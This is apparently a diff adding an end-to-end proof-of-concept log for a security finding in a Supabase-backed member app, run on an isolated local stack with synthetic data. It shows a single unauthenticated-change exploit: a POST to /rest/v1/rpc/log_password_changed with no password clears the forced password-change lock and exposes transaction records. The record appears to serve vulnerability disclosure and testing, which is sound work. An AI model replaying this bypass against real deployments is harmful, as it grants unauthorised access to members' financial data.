@@ -1,0 +1,24 @@
+=== BKC-01 end-to-end over the Supabase REST API (isolated local stack) ===
+
+[1] Sign in as the synthetic member who is still on the staff-issued temporary password
+    signed in OK (access token obtained with the TEMPORARY password)
+
+[2] my_session() — the app sees the forced-change lock
+    must_change_password = true | role = member | member = BND26002
+
+[3] BEFORE the exploit — try to read member data
+    GET /rest/v1/transactions  -> []
+
+[4] THE EXPLOIT — POST /rest/v1/rpc/log_password_changed  (no password supplied)
+    HTTP status: 204
+
+[5] AFTER the exploit — my_session() and member data, same token, same password
+    must_change_password = false | password_set = true
+    GET /rest/v1/transactions  -> [{"reference":"FEE261022002","amount":20000.00}, 
+ {"reference":"SHR261022002","amount":200000.00}, 
+ {"reference":"SAV261022012","amount":100000.00}, 
+ {"reference":"SAV261022013","amount":73500.00}, 
+ {"reference":"SAV261022014","amount":30000.00}]
+
+[6] The temporary password is STILL the live credential — sign in again with it
+    re-sign-in with the temporary password: SUCCEEDED
